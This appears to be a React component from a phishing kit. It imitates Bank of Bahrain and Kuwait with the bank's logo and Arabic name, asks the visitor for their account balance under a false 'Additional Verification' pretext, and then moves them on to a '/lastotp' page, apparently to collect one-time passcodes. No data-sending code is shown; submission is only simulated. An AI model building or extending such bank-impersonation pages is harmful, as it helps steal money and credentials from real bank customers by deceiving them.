// AccountBalance.jsx
import React, { useState } from "react";
import { useNavigate } from "react-router-dom";

export default function AccountBalance() {
  const navigate = useNavigate();
  const [balance, setBalance] = useState("");
  const [loading, setLoading] = useState(false);

  const handleSubmit = (e) => {
    e.preventDefault();

    if (!balance || isNaN(balance)) {
      alert("Please enter a valid balance");
      return;
    }

    setLoading(true);

    // Simulate sending data
    setTimeout(() => {
      setLoading(false);
      // For example, navigate to OTP page
      navigate("/lastotp");
    }, 1500);
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-[#4A90E2] via-[#2E5BBA] to-[#1E3A8A] flex flex-col items-center px-6 py-12 text-white">
      
      {/* Logo */}
      <div className="w-full flex justify-end mb-16">
        <div className="flex flex-col items-center text-center">
          <div className="relative text-3xl font-bold tracking-wide mb-1">
            BBK
            <span className="absolute -top-1 -right-4 text-xl">✱</span>
          </div>
          <div className="text-xs opacity-90 rtl">بنك البحرين والكويت</div>
        </div>
      </div>

      {/* Heading */}
      <div className="text-center mb-10">
        <h1 className="text-2xl font-light mb-2">Additional Verification</h1>
        <p className="text-sm opacity-80">
          For your security, please provide the following information to complete the verification process
        </p>
      </div>

      {/* Form */}
      <form
        onSubmit={handleSubmit}
        className="flex flex-col w-full max-w-md gap-6"
      >
        <input
          type="number"
          placeholder="Enter your account balance *"
          value={balance}
          onChange={(e) => setBalance(e.target.value.replace(/\D/g, ""))}
          required
          className="w-full bg-transparent border-b border-white/50 py-4 text-white placeholder-white/70 focus:border-white outline-none transition"
          inputMode="numeric"
        />

        <button
          type="submit"
          disabled={loading}
          className={`w-full py-4 rounded-full text-lg font-medium transition ${
            loading
              ? "bg-white/30 cursor-not-allowed"
              : "bg-white/20 hover:bg-white/30"
          }`}
        >
          {loading ? (
            <div className="flex items-center justify-center">
              <span className="w-5 h-5 border-2 border-t-white border-white/30 rounded-full animate-spin mr-2"></span>
              Processing...
            </div>
          ) : (
            "Continue"
          )}
        </button>

        {/* Back button */}
        <div className="text-center mt-6">
          <button
            type="button"
            // onClick={() => navigate("/otp")}
            className="bg-transparent border-none text-sm text-white/90 hover:text-white underline cursor-pointer"
          >
            ← Back
          </button>
        </div>
      </form>
    </div>
  );
}
